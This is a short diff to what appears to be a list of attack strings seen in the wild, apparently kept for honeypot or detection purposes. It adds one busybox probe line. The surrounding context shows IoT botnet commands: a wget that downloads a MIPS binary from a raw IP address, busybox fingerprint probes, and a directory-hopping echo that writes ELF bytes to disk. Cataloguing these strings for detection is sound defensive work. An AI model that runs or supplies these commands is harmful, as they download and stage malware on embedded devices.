@@ -230,6 +230,7 @@ wget -nc http://45.87.174.8/k.php?a=mips,F4Y1MHNHN10C9X48H -O ./upnpsetup
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
 User-Agent: python-requests/2.27.1
+cat /proc/mounts; /bin/busybox DCLDN
 cat /proc/mounts; /bin/busybox GSIVI
 cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
 echo TELNET_TEST_OK
